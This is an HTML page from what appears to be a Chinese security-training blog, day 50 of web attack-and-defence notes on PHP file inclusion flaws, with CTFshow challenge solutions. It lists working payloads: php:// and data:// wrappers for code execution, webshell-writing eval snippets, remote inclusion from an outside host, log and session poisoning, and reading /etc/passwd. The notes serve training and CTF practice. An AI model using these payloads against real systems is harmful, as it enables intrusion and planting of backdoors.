@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        web攻防笔记第50天 | KillMen's Home
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E7%A2%8E%E7%A2%8E%E5%BF%B5">反抗者</a>
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">逃亡之路</a>
+            
+              <a class="nav-menu-item" href="/%E5%8E%AE%E6%9D%80%E6%88%98%E5%9C%BA">战场</a>
+            
+              <a class="nav-menu-item" href="/%E7%A7%91%E7%A0%94">研究所</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">web攻防笔记第50天</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" class="post-tag">#笔记</a>
+  
+    <a href="/tags/xiaodi8/" class="post-tag">#xiaodi8</a>
+  
+    <a href="/tags/web%E6%94%BB%E9%98%B2/" class="post-tag">#web攻防</a>
+  
+
+
+          <span class="post-date">2023-08-27</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <p>➢文件包含-原理&amp;分类&amp;利用&amp;修复 ➢黑盒利用-VULWEB-有无包含文件 ➢白盒利用-CTFSHOW-伪协议玩法</p>
+<h2 id="文件包含-原理-amp-分类-amp-利用-amp-修复"><a href="#文件包含-原理-amp-分类-amp-利用-amp-修复" class="headerlink" title="#文件包含-原理&amp;分类&amp;利用&amp;修复"></a>#文件包含-原理&amp;分类&amp;利用&amp;修复</h2><h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时， 直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。 在包含文件的过程中<strong>，如果文件能进行控制，则存储文件包含漏洞</strong></p>
+<p>文件包含：包含的文件就被当作当前脚本语言去代码执行了</p>
+<p>漏洞原因：1、使用的文件包含函数；2、包含的文件可控</p>
+<h3 id="1-1、分类"><a href="#1-1、分类" class="headerlink" title="1.1、分类"></a>1.1、分类</h3><p><strong>本地（服务器文件）包含</strong>-Local File Include-LFI</p>
+<ul>
+<li>有文件利用：上传一个文件，文件写有恶意代码（配合上传）</li>
+<li>无文件利用：</li>
+</ul>
+<ol>
+<li>包含日志文件利用</li>
+<li>包含session文件利用</li>
+<li>伪协议玩法利用</li>
+</ol>
+<p><strong>远程包含</strong>-Remote File Include-RFI：<strong>直接搭建一个可访问的远程URL包含文件</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://192.168.xxx.x:87/include.php?file=http://47.94.236.117/file.txt">http://192.168.xxx.x:87/include.php?file=http://47.94.236.117/file.txt</a></li>
+</ul>
+<p><strong>差异原因</strong>：<strong>代码过滤和环境配置文件开关</strong>决定</p>
+<p><img src="/../image/image-20230827101902345.png" alt="image-20230827101902345"></p>
+<p><img src="/../image/image-20230827101847702.png" alt="image-20230827101847702"></p>
+<h2 id="2、白盒审计：（CTFSHOW）"><a href="#2、白盒审计：（CTFSHOW）" class="headerlink" title="2、白盒审计：（CTFSHOW）"></a>2、白盒审计：（CTFSHOW）</h2><h3 id="白盒发现："><a href="#白盒发现：" class="headerlink" title="-白盒发现："></a>-白盒发现：</h3><p>1、可通过应用功能追踪代码定位审计 </p>
+<p>2、可通过脚本特定函数搜索定位审计 </p>
+<p>3、可通过伪协议玩法绕过相关修复等 </p>
+<p>PHP：<strong>include、require、include_once、require_once</strong>等 </p>
+<p>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行 require函数出现错误的时候，会直接报错并退出程序的执行 Java：java.io.File、java.io.FileReader等 </p>
+<p><a target="_blank" rel="noopener" href="http://asp.net/">ASP.NET</a>：<strong>System.IO.FileStream、System.IO.StreamReader</strong>等</p>
+<h2 id="3、黑盒分析："><a href="#3、黑盒分析：" class="headerlink" title="3、黑盒分析："></a>3、黑盒分析：</h2><h3 id="黑盒发现："><a href="#黑盒发现：" class="headerlink" title="-黑盒发现："></a>-黑盒发现：</h3><p>主要<strong>观察参数传递的数据和文件名是否对应</strong> URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼</p>
+<h2 id="4、利用"><a href="#4、利用" class="headerlink" title="4、利用"></a>4、利用</h2><h3 id="本地利用思路："><a href="#本地利用思路：" class="headerlink" title="本地利用思路："></a>本地利用思路：</h3><p>1、配合文件上传 2、无文件包含日志 3、无文件包含SESSION 4、无文件支持伪协议利用 参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a></p>
+<h3 id="文件读取："><a href="#文件读取：" class="headerlink" title="-文件读取："></a>-文件读取：</h3><ol>
+<li>(绝对路径)<code>file:///etc/passwd</code></li>
+<li>(相对路径)<code>php://filter/read=convert.base64-encode/resource=phpinfo.php</code></li>
+</ol>
+<h3 id="文件写入："><a href="#文件写入：" class="headerlink" title="-文件写入："></a>-文件写入：</h3><ol>
+<li><code>php://filter/write=convert.base64-encode/resource=phpinfo.php</code>（还需要给一个参数，CTF常考但不常用）<code>file_put_contents($_GET[&#39;file&#39;],$_POST[&#39;content&#39;]);</code></li>
+<li><code>php://input</code> + POST传输:<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</code></li>
+</ol>
+<h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="-代码执行："></a>-代码执行：</h3><ol>
+<li><code>php://input</code>  POST: <code>&lt;?php phpinfo();?&gt;</code></li>
+<li><code>data://text/plain,&lt;?php phpinfo();?&gt;</code></li>
+<li><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></li>
+</ol>
+<h3 id="远程利用思路："><a href="#远程利用思路：" class="headerlink" title="远程利用思路："></a>远程利用思路：</h3><p>直接搭建一个可访问的远程URL包含文件</p>
+<h2 id="5、修复见网上参考方案"><a href="#5、修复见网上参考方案" class="headerlink" title="5、修复见网上参考方案"></a>5、修复见网上参考方案</h2><h3 id="黑盒利用-VULWEB-有无包含文件"><a href="#黑盒利用-VULWEB-有无包含文件" class="headerlink" title="#黑盒利用-VULWEB-有无包含文件"></a>#黑盒利用-VULWEB-有无包含文件</h3><p><a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/showimage.php?file=index.php">http://testphp.vulnweb.com/showimage.php?file=index.php</a></p>
+<h3 id="白盒利用-CTFSHOW-伪协议玩法"><a href="#白盒利用-CTFSHOW-伪协议玩法" class="headerlink" title="#白盒利用-CTFSHOW-伪协议玩法"></a>#白盒利用-CTFSHOW-伪协议玩法</h3><p><a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a></p>
+<h3 id="78-php-amp-http协议"><a href="#78-php-amp-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h3><p>payload: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php payload: ?file&#x3D;php:&#x2F;&#x2F;input post:<?php system('tac flag.php');?> payload: ?file&#x3D;<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/1.txt">http://www.xiaodi8.com/1.txt</a> 1.txt:<?php system('tac flag.php');?></p>
+<h3 id="79-data-amp-http协议"><a href="#79-data-amp-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h3><p>payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac flag.*');?> payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D; payload: ?file&#x3D;<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/1.txt">http://www.xiaodi8.com/1.txt</a> 1.txt:<?php system('tac flag.php');?></p>
+<h3 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h3><p>1、利用其他协议,如file,zlib等 2、利用<strong>日志记录UA</strong>特性包含执行 分析需文件名及带有php关键字放弃 故利用日志记录UA信息，UA带入代码 包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<h3 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h3><p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</p>
+<p>自定义session名字，条件竞争访问session文件，触发创建新文件 <!DOCTYPE html> <html> <body> <form action="http://xxxx.ctf.show/" method="POST" enctype="multipart/form-data"> <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1])?>'?>" /> <input type="file" name="file" /> <input type="submit" value="submit" /> </form> </body> </html> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lnterpreter/p/14086164.html">https://www.cnblogs.com/lnterpreter/p/14086164.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/echoDetected/p/13976405.html">https://www.cnblogs.com/echoDetected/p/13976405.html</a></p>
+<h3 id="87-php-x2F-x2F-filter-x2F-write-amp-加密编码"><a href="#87-php-x2F-x2F-filter-x2F-write-amp-加密编码" class="headerlink" title="87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</h3><p>1、利用base64: url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;</p>
+<p>2、利用凯撒13： url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php content&#x3D;<?cuc riny($_CBFG[1]);?></p>
+<p>88-data&amp;base64协议 过滤PHP，各种符号，php代码编码写出无符号base64值 Payload：file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs&#x2F;PmFk</p>
+<h3 id="117-php-x2F-x2F-filter-x2F-write-amp-新的算法"><a href="#117-php-x2F-x2F-filter-x2F-write-amp-新的算法" class="headerlink" title="117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法"></a>117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法</h3><p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用 <?php $result = iconv("UCS-2LE","UCS-2BE", '<?php eval($_POST[a]);?>‘); echo “经过一次反转:”.$result.”\n”; echo “经过第二次反转:”.iconv(“UCS-2LE”,”UCS-2BE”, $result); ?&gt; Payload：file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php contents&#x3D;?&lt;hp pvela$(P_SO[T]a;)&gt;?</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/08/27/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC51%E5%A4%A9/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>web攻防笔记第51天</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/08/27/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC49%E5%A4%A9/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      web攻防笔记第49天
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">莫</div><div class="matts">挨</div><div class="matts">姥</div><div class="matts">子</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">乐</div><div class="matts">骟</div><div class="matts">好</div><div class="matts">弑</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">Theme Tranquility</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:假的@email.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-wx.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI3NzQ4NDkzNg==&mid=2247484469&idx=1&sn=8a442bb67397f52cce5c38c3f9b41e36&chksm=eb64c0d2dc1349c40d2e1bb55615ae28b3f2951be22f00717b9ade98c851082e42dc666ab45d#rd">微信公众号</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-zh.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.zhihu.com/">知乎</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:假的@email.com">假的@email.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">KillMen's Home</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+  
+
+  </body>
+</html>
